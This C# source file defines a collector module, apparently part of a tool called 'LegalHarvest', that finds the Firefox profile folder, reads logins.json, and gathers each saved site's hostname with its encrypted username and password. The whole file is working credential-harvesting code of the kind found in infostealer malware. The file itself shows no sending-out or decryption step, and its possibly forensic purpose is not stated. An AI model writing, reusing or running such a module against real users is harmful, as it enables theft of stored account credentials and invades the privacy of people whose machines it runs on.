using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;

namespace LegalHarvest.Modules
{
    public class FirefoxPasswordsModule : ICollectorModule
    {
        public string ModuleName => "FirefoxPasswords";
        public bool CanExecute()
        {
            string profileDir = GetProfileDirectory();
            return profileDir != null && File.Exists(Path.Combine(profileDir, "logins.json"));
        }

        private string GetProfileDirectory()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string firefoxDir = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");
            if (!Directory.Exists(firefoxDir)) return null;
            foreach (string dir in Directory.GetDirectories(firefoxDir))
                if (File.Exists(Path.Combine(dir, "logins.json"))) return dir;
            return null;
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string profileDir = GetProfileDirectory();
            if (profileDir == null) return items;

            string loginsPath = Path.Combine(profileDir, "logins.json");
            JObject json = JObject.Parse(File.ReadAllText(loginsPath));
            foreach (var login in json["logins"])
            {
                items.Add(new CollectedItem
                {
                    Category = "FirefoxPasswords",
                    Name = login["hostname"].ToString(),
                    Value = $"User={login["encryptedUsername"]};Pass={login["encryptedPassword"]}",
                    Timestamp = DateTime.Now
                });
            }
            return items;
        }
    }
}
